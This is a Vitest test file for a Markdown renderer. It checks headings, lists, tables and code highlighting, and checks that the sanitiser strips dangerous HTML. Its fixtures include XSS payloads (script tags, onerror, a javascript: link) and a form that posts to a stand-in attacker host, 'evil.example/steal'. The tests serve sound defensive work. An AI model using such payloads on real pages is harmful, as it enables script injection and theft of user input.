// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import { highlightSource, renderMarkdown } from './markdown';

describe('renderMarkdown', () => {
	const fixture = [
		'# Heading',
		'',
		'- one',
		'- two',
		'',
		'| A | B |',
		'| - | - |',
		'| 1 | 2 |',
		'',
		'```rust',
		'fn main() {}',
		'```'
	].join('\n');

	it('renders a heading, a list and a table, with the fenced rust block highlighted', () => {
		const html = renderMarkdown(fixture);
		expect(html).toContain('<h1>Heading</h1>');
		expect(html).toContain('<li>one</li>');
		expect(html).toContain('<table>');
		expect(html).toContain('class="hljs language-rust"');
		expect(html).toMatch(/class="hljs-/);
	});

	it('strips a script tag and an onerror attribute', () => {
		const html = renderMarkdown(
			'<script>alert(1)</script>\n\n<img src="x" onerror="alert(1)">\n\nSafe text'
		);
		expect(html).not.toContain('<script');
		expect(html).not.toContain('onerror');
		expect(html).toContain('Safe text');
	});

	it('renders an image as its alt text and drops a relative link', () => {
		const html = renderMarkdown(
			'![a screenshot](./shot.png)\n\n[relative](../docs/x.md)\n\n[external](https://example.com)'
		);
		expect(html).not.toContain('<img');
		expect(html).toContain('a screenshot');
		expect(html).not.toContain('href="../docs/x.md"');
		expect(html).toContain('href="https://example.com"');
	});

	it('drops a raw HTML form and its input entirely', () => {
		const html = renderMarkdown(
			'<form action="https://evil.example/steal" method="post"><input name="x"></form>\n\nSafe text'
		);
		expect(html).not.toContain('<form');
		expect(html).not.toContain('<input');
		expect(html).toContain('Safe text');
	});

	it('drops a raw anchor with a relative href', () => {
		const html = renderMarkdown('<a href="/relative">relative</a>');
		expect(html).not.toContain('href="/relative"');
		expect(html).not.toContain('<a ');
		expect(html).not.toContain('<a>');
	});

	it('drops a raw anchor with a mailto: href', () => {
		const html = renderMarkdown('<a href="mailto:x@example.com">mail</a>');
		expect(html).not.toContain('mailto:');
		expect(html).not.toContain('<a ');
		expect(html).not.toContain('<a>');
	});

	it('drops a raw anchor with a javascript: href', () => {
		const html = renderMarkdown('<a href="javascript:alert(1)">click</a>');
		expect(html).not.toContain('javascript:');
		expect(html).not.toContain('<a ');
		expect(html).not.toContain('<a>');
	});

	it('drops a raw SVG image element, the same as a Markdown one', () => {
		const html = renderMarkdown('<svg><image href="https://example.com/x.png" /></svg>');
		expect(html).not.toContain('<svg');
		expect(html).not.toContain('<image');
	});

	it('keeps a GFM task-list checkbox but drops any other raw input', () => {
		const html = renderMarkdown('- [x] done\n\n<input type="text" name="evil">');
		expect(html).toContain('type="checkbox"');
		expect(html).not.toContain('type="text"');
		expect(html).not.toContain('name="evil"');
	});
});

describe('highlightSource', () => {
	it('wraps the whole source in a highlighted pre, as markdown', () => {
		const html = highlightSource('# Heading\n\nSome *text* and `code`.');
		expect(html).toContain('<pre class="hljs">');
		expect(html).toMatch(/class="hljs-/);
	});
});
